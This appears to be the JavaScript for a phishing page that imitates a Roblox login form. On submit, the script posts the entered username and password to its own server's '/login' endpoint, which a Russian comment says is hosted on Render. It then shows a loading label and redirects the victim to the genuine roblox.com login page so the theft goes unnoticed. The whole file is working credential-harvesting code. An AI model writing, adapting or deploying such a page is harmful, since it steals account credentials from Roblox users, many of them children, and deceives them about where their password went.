document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById('loginForm');
    
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        const loginBtn = document.querySelector('.login-btn');
        loginBtn.textContent = "Загрузка...";
        loginBtn.disabled = true;

        try {
            // Отправляем данные на наш собственный сервер (на Render)
            await fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
        } catch (error) {
            console.error("Ошибка:", error);
        }

        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login";
        }, 1500);
    });
});
